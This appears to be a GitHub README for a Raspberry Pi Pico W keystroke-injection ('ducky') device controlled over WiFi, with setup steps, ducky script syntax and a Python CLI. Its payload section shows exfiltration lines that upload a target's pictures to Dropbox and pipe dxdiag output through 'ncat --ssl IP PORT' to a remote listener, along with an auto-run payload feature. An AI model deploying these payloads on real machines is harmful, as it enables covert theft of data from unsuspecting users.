
# Pico ducky with CLI over WiFi

Inspired by [dbisu's pico-ducky project](https://github.com/dbisu/pico-ducky). I decided pick up a [Raspberry Pi Pico W](https://www.raspberrypi.com/documentation/microcontrollers/raspberry-pi-pico.html) myself to experiment and play around with some of the ducky possiblities. I also added a CLI for the already existing web interface made by [dbisu](https://github.com/dbisu/pico-ducky).

### Use this tool and payloads to automate stuff and only for LEGAL purposes! Never target anyone if they DIDN'T give you permission as it is !!!ILLEGAL!!!


https://github.com/fortijs40/PICO-w-ducky-CLI/assets/59094867/9d7aed21-3bb4-4a99-95fe-eb1a02646be1


## Tools needed

Needed for this project:

- Raspberry Pi Pico W
- Micro USB to USB adapter
- Device to control pico through Wi-Fi (Laptop or phone with CLI)
(Optional) - stuff for payloads in this repository.
- Server to listen Ncat requests
- Dropbox access token

## Configuring Pico W

1.  [Download](https://github.com/fortijs40/PICO-w-ducky-CLI/releases/tag/Release_v1.0) everything and un-zip ```Pico.W.release.zip```
2. Plug in Raspberry Pico W to your computer and drag ```adafruit-circuitpython-raspberry_pi_pico_w-en_US-8.0.0.uf2``` into ```RPI-RP2``` and wait till it reboots
3. Copy over these files: ```code.py```  ```boot.py```  ```duckyinpython.py```  ```secrets.py```  ```webapp.py```  ```wsgiserver.py``` and  ```lib``` folder from ``` Pico W Release```  folder
4. Create new payloads or use existing ones
5. !!! ```secrets.py``` Contain wifi login and password for Pico W access point. You can change this or leave as is, but remember the login details.
6. (CAREFUL - if you have created and named script as ```payload1.dd```  it will run automatically after plugging in) Unplug and plug in again the Pico W 
7. You can now connect to ```TestAP``` WiFi access point and use CLI script [```CLI_4_web_ducky.py```](https://github.com/fortijs40/PICO-w-ducky-CLI/releases/download/Release_v1.0/CLI_4_web_ducky.py) for controlling the ducky remotely.
8. Don't do anything illegal and have fun automating stuff.
## Modifying ducky after setting it up

After setting everything up you might want to access the ducky again as mass storage device.

To do so, you need to:
- Connect the ```GP0``` and ```GND``` pin to not launch ```payload1.dd``` immediately after plugging it in (if you don't have ```payload1.dd``` on your ducky, then you can ignore this)
 
![Screenshot](https://github.com/fortijs40/PICO-w-ducky-CLI/assets/59094867/0dd89f32-3f50-4a92-9d01-3cd22131d31c)
- Connect the ```GP15``` and ```GND``` pin to have the ducky open up as mass storage device.
![Screenshot](https://github.com/fortijs40/PICO-w-ducky-CLI/assets/59094867/b62cd988-538b-4224-9a75-38c92c847a74)
## Main ducky script commands

```GUI r``` is the same as pressing ```win+r```. and can be used to launch ```cmd/powershell and other programs```

```STRING``` is used to type characters an example from my payload to force language to US in powershell
```
STRING Set-WinUserLanguageList -Force en-US

```
```REM``` is used to comment stuff out example from my payload. Everything in the same line after REM is simply ignored

```
REM You can change which ever path you want to the the pictures/files from.
REM Change line 32 to your OWN Dropbox access token
```

```DELAY``` is used to delay ducky from typing more commands and allow previous command to execute before the next one is ran. For example, if automating stuff on slower PC, ```DELAY``` will have to be increased or else the payload might mess up.
In example below ducky will wait 5 seconds after ```ENTER``` before executing next commands.
```
STRING Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers
ENTER
DELAY 5000
```
```ENTER``` and ```DELETE``` are quite self explanatory. They can be used by themselves to either delete stuff or enter stuff.

Keys like ```CTRL```, ```ALT```, ```DELETE```,```ESC```,```TAB``` can be chained to gether to execute some of their combos.

More unique commands and keystrokes can be found in duckyinpython.py
## My payloads

I wanted to focus on exfiltration payloads and wanted to construct 2 scenarios with different exfiltration methods.

### 1. [Exfiltration using dropbox API](https://github.com/fortijs40/PICO-w-ducky-CLI/blob/master/image_grab_n_exfiltrate.dd)

I got inspired from one of [Hack5 payloads](https://github.com/hak5/bashbunny-payloads/tree/master/payloads/library/exfiltration/dropbox-exfiltrator) to use dropbox API to exfiltrate some data. So I combined a script of gathering some pictures and the dropbox API script to exfiltrate images to my dropbox.

* One bad thing about this method of exfiltration is that [dropbox no longer supports long-lasting access tokens](https://developers.dropbox.com/oauth-guide#:~:text=Helper%20methods%20accept%20the%20refresh,for%20compatibility%20until%20mid%202021.) and current access tokens expire quite quickly which means the payload also needs to be changed often.

### 2. [Exfiltration using Ncat](https://github.com/fortijs40/PICO-w-ducky-CLI/blob/master/dxdiag_ncat.dd)
For this exfiltration I wanted to demonstrate that if target system has a tool like Ncat, it can also be used to exfiltrate some information. So this payload is meant to exfiltrate dxdiag file from a Windows system to a remote PC by using ncat which is listening all the time. The script execute time is quite long because dxdiag takes some time. After that I used --ssl to encrypt the traffic.
```
ENTER
REM 12 second delay time to complete the dxdiag, since it takes a bit of time
DELAY 12000
REM takes dxdiag output and sends it over ncat to specific IP and port
STRING Get-Content "$env:TEMP\infins.txt" | ncat --ssl IP PORT
DELAY 100
ENTER
DELAY 5000

```

* This method can only work if target system has ncat installed.
## Web Interface

Web interface from [dbisu's pico-ducky project](https://github.com/dbisu/pico-ducky) was quite simple. 
It contained 6 access points:
- ```192.168.1.4:80/```
- ```192.168.1.4:80/ducky``` Main screen which displays available payloads
- ```192.168.1.4:80/new```  Used to create new payloads
- ```192.168.1.4:80/edit/<file_name>``` Used to edit existing payloads
- ```192.168.1.4:80/write/<file_name>``` Used as POST from edit to overwrite the previous payload
- ```192.168.1.4:80/run/<file_name>``` Execute the payload by its file_name

### Web Interface issues I noticed

* If file is edited or written by using web end points it will replace all ```+``` with ```space' '```. It is something that is needed to be kept in mind.
* Editing big payloads multiple times can sometimes crash the webserver and you will have to replug the ducky
* Editing non existant file will instanlty crash the Pico W webserver

## Command Line Interface
I made a CLI [```cmd_4_web_ducky.py```](https://github.com/fortijs40/PICO-w-ducky-CLI/blob/master/cmd_4_web_ducky.py) based on provided web endpoints. CLI can be used instead of the web interface since it might be easier to use on some systems rather than the web.

CLI has few options:

- Ability to list names of scripts that are loaded on ducky
```
python ./cmd_4_web_ducky.py -l
or
python ./cmd_4_web_ducky.py --list
```
- Ability to run the loaded in scripts
```
python ./cmd_4_web_ducky.py -r <script_name>
or
python ./cmd_4_web_ducky.py --run <script_name>
```
- Ability to create new scripts based on existing file in the system. 
```
python ./cmd_4_web_ducky.py -c <script_path>
or
python ./cmd_4_web_ducky.py --create <script_path>
```
- Ability to edit files on ducky. Existing file on ducky will get overwritten by the local file and there is a small chance that Pico W webserver might crash if payload is too big.
```
python ./cmd_4_web_ducky.py -e <script_name> <script_path>
or
python ./cmd_4_web_ducky.py --edit <script_name> <script_path>
```
- Ability to show the content of existing scripts on ducky
```
python ./cmd_4_web_ducky.py -s <script_name>
or
python ./cmd_4_web_ducky.py --show <script_name>
```
![cli](https://github.com/fortijs40/PICO-w-ducky-CLI/assets/59094867/f947e091-dbc4-4347-a6f2-7cc033307920)
## Revert ducky back to Pico W

To revert pico ducky back to regular Pico W:

* Unplug the ducky
* Hold ```BOOTSEL``` button on Pico W and plug it in while holding down the button. It will open mass storage to reset the Pico W
* Download [flash.nuke.uf2](https://datasheets.raspberrypi.com/soft/flash_nuke.uf2)
* Drag ```flash.nuke.uf2``` it into ```RPI-RP2```
* After reset Pico W should be flashed and clean
